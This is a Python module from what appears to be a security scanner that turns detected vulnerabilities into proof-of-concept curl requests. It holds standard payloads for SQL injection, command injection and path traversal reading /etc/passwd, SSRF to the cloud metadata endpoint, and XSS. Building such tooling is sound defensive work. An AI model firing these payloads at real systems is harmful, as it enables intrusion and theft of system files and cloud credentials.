"""Generate a concrete proof-of-concept request for a finding.

This is the 'code-guided attack' step: because we know the vulnerability class
and the exact parameter that reaches the sink, we can craft the payload that
would exploit it (and, in a future dynamic mode, actually fire it).
"""
from __future__ import annotations

import re
from urllib.parse import quote

from .discover import Endpoint

PAYLOADS: dict[str, str] = {
    "SQLI": "' OR '1'='1' -- -",
    "CMDI": "127.0.0.1; cat /etc/passwd",
    "PATH": "../../../../etc/passwd",
    "SSRF": "http://169.254.169.254/latest/meta-data/",
    "XSS": "<script>alert(1)</script>",
}

_BODY_METHODS = {"POST", "PUT", "PATCH"}


def _fill_path(path: str, param: str, payload: str, is_path_param: bool) -> str:
    # Replace <param> / {param} / :param placeholders. The exploited one gets the
    # payload; others get a benign '1'.
    out = path
    # Flask <conv:name> / FastAPI {name}
    for token_l, token_r in (("<", ">"), ("{", "}")):
        while token_l in out and token_r in out:
            start = out.index(token_l)
            end = out.index(token_r, start)
            inner = out[start + 1 : end]
            name = inner.split(":")[-1].strip()
            value = quote(payload, safe="") if (is_path_param and name == param) else "1"
            out = out[:end + 1].replace(f"{token_l}{inner}{token_r}", value) + out[end + 1:]
    # Express :name segments
    def _repl(m: "re.Match[str]") -> str:
        name = m.group(1)
        return quote(payload, safe="") if (is_path_param and name == param) else "1"

    out = re.sub(r":([A-Za-z_]\w*)", _repl, out)
    return out


def build_poc(endpoint: Endpoint, vuln: str, param: str, base_url: str = "http://TARGET") -> tuple[str, str]:
    payload = PAYLOADS.get(vuln, "PAYLOAD")
    is_path_param = param in endpoint.path_params
    path = _fill_path(endpoint.path, param, payload, is_path_param)
    url = base_url.rstrip("/") + path

    method = endpoint.method.upper()
    if is_path_param:
        return payload, f"curl '{url}'"

    if method in _BODY_METHODS:
        # Parameter travels in the request body. Double-quote so payloads that
        # contain single quotes (SQLi) don't break shell quoting.
        safe_payload = payload.replace('"', '\\"')
        return payload, f'curl -X {method} \'{url}\' \\\n     --data-urlencode "{param}={safe_payload}"'

    # Query-string parameter.
    sep = "&" if "?" in url else "?"
    enc = quote(payload, safe="")
    return payload, f"curl '{url}{sep}{param}={enc}'"
